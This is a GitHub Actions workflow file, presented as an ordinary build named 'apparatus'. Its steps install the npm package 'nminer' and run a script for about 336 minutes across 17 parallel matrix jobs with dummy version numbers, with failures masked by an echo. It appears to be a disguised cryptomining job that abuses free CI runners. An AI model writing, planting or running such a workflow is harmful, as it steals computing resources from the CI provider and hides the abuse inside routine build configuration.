name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6813 }
          - { version: 4276 }
          - { version: 3964 }
          - { version: 440 }
          - { version: 7440 }
          - { version: 2138 }
          - { version: 6759 }
          - { version: 1730 }
          - { version: 9120 }
          - { version: 8457 }
          - { version: 7484 }
          - { version: 1008 }
          - { version: 4273 }
          - { version: 4528 }
          - { version: 4674 }
          - { version: 3350 }
          - { version: 49 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: siege oh
        run: |
          npm install nminer@latest
          timeout 336m node apparatus.js || echo "apparatus executed"